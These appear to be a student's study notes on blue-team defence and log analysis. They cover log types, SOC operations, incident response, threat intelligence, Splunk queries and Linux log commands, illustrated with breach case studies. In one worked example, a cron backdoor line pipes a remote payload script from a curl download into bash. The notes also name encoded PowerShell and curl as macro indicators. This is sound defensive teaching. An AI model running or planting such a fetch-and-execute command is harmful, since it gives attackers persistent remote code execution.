Blue Team & Log Analysis – Complete Notes (from both PDFs)
Author: Azariya Chombe
1. What is a Blue Team?

Blue Team = the defenders. They protect the organization from cyber attacks.

Mission:

    Protect confidentiality, integrity, and availability (CIA)

    Maintain continuous visibility across all systems

    Detect malicious behavior early to reduce dwell time

    Respond quickly using playbooks

    Harden controls using threat intelligence

Key tools: SIEM, EDR, IDS/IPS, Firewalls
2. Why Logs Matter

A log is a timestamped record of everything that happens on a system – logins, file opens, network connections, errors.

    Without comprehensive logs, the Blue Team is blind.

Real-World Example: SolarWinds (2020)

    What happened: APT29 (Russian state hackers) hid inside SolarWinds Orion software for 9 months before detection.

    Why it matters: 18,000 organizations infected, including US government agencies.

    Lesson: If defenders had been reading network & authentication logs, they would have seen strange traffic within days – not months.

3. The 8 Types of Logs
Log Type	What it captures	Examples
System	OS events: process creation, service changes, crashes	Windows Event Log, Linux syslog, journald
Network	Traffic: connections, ports, bytes transferred, allow/deny decisions	NetFlow, firewall logs, IDS/IPS alerts
Application	Web server, database, API activity	Apache/Nginx logs, SQL queries, API access
Security	Alerts from antivirus, EDR, WAF	Virus detections, EDR alerts, DLP violations
Authentication	Logins, logouts, MFA events, account lockouts	Windows Event 4624/4625, SSH auth.log, VPN sessions
DNS	Domain lookups, DGA, DNS tunneling	Query logs, NXDOMAIN replies
Cloud	Actions in AWS, Azure, GCP	CloudTrail, Azure Monitor, S3 access logs
Email	Email delivery, attachments, link clicks	SMTP logs, SPF/DKIM/DMARC results
4. Minimum Fields Every Log Must Have

If even one is missing, your investigation has a gap.
Field	Why it matters
Timestamp (UTC)	Build timelines across different time zones
Source	IP or computer name that sent the request
Destination	Server, website, or computer contacted
User	Which account was involved
Action	What they did (login, delete, block)
Result	Success or failure
Process	Which program caused the event
Hash	Unique fingerprint of a file
URL/Domain	Website or domain contacted
Bytes	How much data moved
Severity	Low/Medium/High/Critical
5. Real-World Example: Target Data Breach (2013)

What happened: Attackers entered through an HVAC vendor's credentials, installed malware on POS terminals, stole 40 million credit cards.

The logging failure: A security tool fired alerts – but they were ignored. Authentication logs showed a vendor account accessing internal systems at 2 AM. No one investigated.

What good logging would have caught:

    Auth log: vendor account login at 2 AM from unusual IP

    Network log: POS terminals connecting to external server

    DNS log: queries to unknown attacker domains

Cost: $162 million in damages.

    Logging without reviewing logs is just expensive storage.

6. The 5W1H Framework

Turn raw events into a defensible conclusion.
Question	What to document
What?	Event type, action, affected asset, artifacts
When?	Timestamp, duration, sequence, recurrence
Where?	Source, destination, network path, location
Who?	User, process, actor, system identity
How?	Attack vector, MITRE ATT&CK technique, tools, evasion
Why?	Motivation, root cause, impact, intelligence value

    Every unanswered question is an investigation gap.

Example: Ransomware Attack Using 5W1H

    WHAT: LockBit 3.0 ransomware encrypted shared drives

    WHEN: Initial click 8:14 AM, encryption started 8:22 AM, detected 9:05 AM (dwell time: 51 minutes)

    WHERE: Started on WS-ACCT-04, spread to file server FS-01 via SMB

    WHO: Compromised user account (phishing)

    HOW: Phishing email → malicious macro → PowerShell downloader → ransomware

    WHY: Financial motive; root cause = no MFA + unpatched SMB vulnerability

7. SOC Operations (Security Operations Center)

A SOC converts noisy alerts into prioritized response.

Analyst tiers:
Level	Role	Responsibilities
L1	Triage	Monitor dashboards, classify alerts, escalate confirmed cases
L2	Investigate	Correlate logs, scope impact, coordinate remediation
L3	Hunt	Proactive hunts, custom rules, reverse engineering
Manager	Lead	Metrics, escalation authority, vendors, strategy

Key metrics (KPIs):

    MTTD (Mean Time to Detect): target < 1 hour

    MTTR (Mean Time to Respond): target < 4 hours

    False positive rate: high = analyst fatigue

    Alert volume: total alerts per day

    Escalation rate: % of L1 alerts sent to L2

Real-World Example: A Day in a SOC (Illustrative)

    08:00 – L1 reviews 847 overnight alerts. SOAR auto-closes most. 12 remain.

    08:45 – Alert #7: Multiple failed VPN logins from Tor exit node. L1 escalates to L2.

    09:10 – L2 investigates: same user had successful login from Nairobi 10 minutes later → impossible travel. Account disabled.

    10:30 – L3 hunts: writes Sigma rule for this pattern, blocks IP range.

KPIs achieved: MTTD = 45 min (<1h target), MTTR = 2h 15min (<4h target)
8. Incident Response (IR) – 6 Phases (NIST SP 800-61)
Phase	Action
1. Preparation	Plans, playbooks, tools, training
2. Detection & Analysis	Validate alerts, assign severity, preserve evidence
3. Containment	Isolate hosts, block IOCs, reset credentials
4. Eradication	Remove root cause, persistence, malware
5. Recovery	Restore clean systems, monitor
6. Post-Incident	Report, improve rules, share IOCs

Severity drives urgency:

    P1 (Critical) – 15 minutes

    P2 (High) – <1 hour

    P3 (Medium) – <4 hours

    P4 (Low) – <24 hours

Real-World Example: WannaCry Ransomware (2017)

    What happened: 230,000+ computers infected in 150 countries in one day. Exploited EternalBlue (SMB vulnerability).

    Preparation (where most failed): Microsoft patch MS17-010 was released 2 months earlier. Organizations with patching playbooks were protected. NHS UK had not patched – devastated.

    Containment: A researcher discovered a kill-switch domain that stopped new infections.

    Recovery: Organizations with offline backups recovered. Those without paid ransom or lost data.

    Post-incident: NHS spent £92 million on cybersecurity improvements.

    Preparation (patching + backups) determines whether an incident is minor or catastrophic.

9. Cyber Threat Intelligence (CTI)

CTI turns raw threat data into decisions defenders can act on.

Three levels:
Level	Audience	Example
Strategic	Executives	"North Korean APTs target African financial institutions via SWIFT"
Operational	SOC managers	"Lazarus uses LinkedIn phishing with malicious PDF job offers"
Tactical	Tools (firewall, EDR)	Block IP 5.5.5.5, block file hash d41d8cd...

Common standards: STIX, TAXII, MISP, OpenCTI, YARA, Sigma
Real-World Example: Lazarus Group (North Korean APT)

    Who: State-sponsored group. Stole $81M from Bangladesh Bank (2016), hacked Sony Pictures (2014).

    How logs catch them:

        Email log: Spoofed sender, malicious PDF attachment

        System log: Acrobat.exe spawned PowerShell → downloaded malware

        DNS log: Lookup of lazarus2.xyz (flagged malicious by VirusTotal)

        Auth log: Account logged into SWIFT server at 3 AM from new machine

        Network log: Large data transfer to foreign IP on uncommon port 8443

10. Log Analysis – 7-Step Method
Step	Action
1. Collect & Centralise	Pull logs from ALL sources into SIEM. Normalize timestamps to UTC.
2. Parse & Normalise	Break raw text into structured fields. Use Common Information Model (CIM).
3. Establish a Baseline	Learn what NORMAL looks like. You can't spot weird without knowing normal.
4. Apply Detection Logic	Run rules, thresholds, Sigma rules, MITRE ATT&CK detections.
5. Contextualise & Correlate	Never read one log line alone. Join auth + network + DNS to build full story.
6. Answer the 5W1H	Document every question. Every gap is a failure.
7. Determine Disposition	True Positive / False Positive / Benign True Positive.
Disposition Types
Type	Meaning	Action
True Positive (TP)	Real attack	Escalate, contain, investigate, open IR ticket
False Positive (FP)	Alert fired but no threat	Tune the detection rule, document why
Benign True Positive (BTP)	Behavior happened but not malicious	Close with documentation explaining why

    40% false positive rate = analysts dismiss half their alerts → real attacks slip through.

11. Detection Queries (Splunk SPL)
Detect Brute Force (Failed Logins)
text

index=windows EventCode=4625 | stats count by src_ip | where count > 20 | sort - count

Action: Check if any IP later has a successful login (EventCode 4624). If yes → account compromised.
Detect Pass-the-Hash Attack
text

index=windows EventCode=4624 Logon_Type=3 | search NOT Authentication_Package=Kerberos

Action: Identify which account and machine. This almost always means attacker is moving laterally.
Detect Malicious Office Macros
text

index=sysmon EventCode=1 | where ParentImage LIKE "*\winword*" OR ParentImage LIKE "*\excel*" | table CommandLine, Image, ParentImage

Action: If you see powershell -enc or cmd /c curl, isolate the machine immediately.
Detect DGA / DNS Tunnelling
text

index=dns | eval query_len=len(query) | where query_len > 50 | stats count by query | sort - count

Action: Look up domain in VirusTotal. If malicious, block on DNS firewall.
Detect Data Exfiltration via Uncommon Ports
text

index=network action=allowed | where dest_port NOT IN (80,443,53,22,25) | stats sum(bytes_out) by src_ip, dest_port | sort - sum(bytes_out)

Action: Large bytes out on port 4444 to foreign IP = serious P1 incident.
12. Linux Log Analysis – Key Commands
Purpose	Command
Watch live auth failures	tail -f /var/log/auth.log | grep 'Failed'
Count failed SSH per IP	grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
Filter logs by time range	awk '/Oct 10 08:00:00/,/Oct 10 09:00:00/' /var/log/syslog
Find large file transfers (Nginx)	awk '{print $7, $10}' /var/log/nginx/access.log | sort -k2 -rn | head -20
Extract unique IPs (Apache)	awk '{print $1}' /var/log/apache2/access.log | sort -u
Find system errors in last 24 hours	journalctl -p err -xe --since '24 hours ago'
Find suspicious cron tasks	grep -r "/var/spool/cron/" /etc/cron* 2>/dev/null
Real-World Example: Catching an Attack with Linux Commands

Scenario: University web server slow on Saturday night.

    tail -f auth.log | grep Failed → 1,200 failed SSH attempts from IP 185.220.101.x in 10 minutes

    Count per IP → 847 attempts from one IP. Blocked with: sudo ufw deny from 185.220.101.x

    journalctl -p err --since '1 hour ago' → cron job /tmp/.update.sh ran 3 times (suspicious path)

    grep -r "/etc/cron*" → found: * * * * * curl http://45.33.x.x/payload.sh | bash

Conclusion: Attacker succeeded earlier, installed cron-based backdoor. Removed persistence, rebuilt server. Dwell time: 2 hours 15 minutes.
13. Core Principles (7 Pro Tips)

    Assume breach and hunt continuously – Don't wait for alerts. Schedule weekly hunts.

    Log everything that matters – Visibility gaps become blind spots.

    Correlate events – Never analyze single signals in isolation.

    Document rigorously – If you can't explain your decision, it didn't happen.

    Continuously improve – Update rules after every incident.

    Know the baseline – You can't spot anomalies without knowing normal.

    Use threat intelligence – Prioritize defenses based on who is targeting you.

14. Quick Summary Table
Topic	One sentence
Blue Team	Defenders who monitor, detect, respond, and improve
Logs	Timestamped records – the computer's diary
8 log types	System, Network, App, Security, Auth, DNS, Cloud, Email
5W1H	Six questions to close investigation gaps
SOC	L1→L2→L3 funnel with MTTD <1h, MTTR <4h
Incident Response	6 phases: Prep → Detect → Contain → Eradicate → Recover → Learn
CTI	Strategic, Operational, Tactical intelligence
Log analysis	7-step method: Collect → Parse → Baseline → Detect → Correlate → 5W1H → Disposition

